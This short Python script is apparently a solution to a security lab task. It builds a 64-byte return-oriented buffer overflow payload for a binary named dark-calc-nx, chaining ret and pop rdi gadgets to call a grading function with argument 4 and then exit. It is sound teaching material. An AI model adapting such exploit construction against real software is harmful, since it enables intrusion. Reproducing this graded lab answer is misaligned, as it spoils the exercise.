#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""

import sys

RET = 0x401A34
POP_RDI = 0x401A33
GRADE_EVAL = 0x401978
EXIT_PLT = 0x4016E0

payload = (
    b"A" * 24
    + RET.to_bytes(8, "little")
    + POP_RDI.to_bytes(8, "little")
    + (4).to_bytes(8, "little")
    + GRADE_EVAL.to_bytes(8, "little")
    + EXIT_PLT.to_bytes(8, "little")
)

assert len(payload) == 64
assert b"\n" not in payload
sys.stdout.buffer.write(payload)








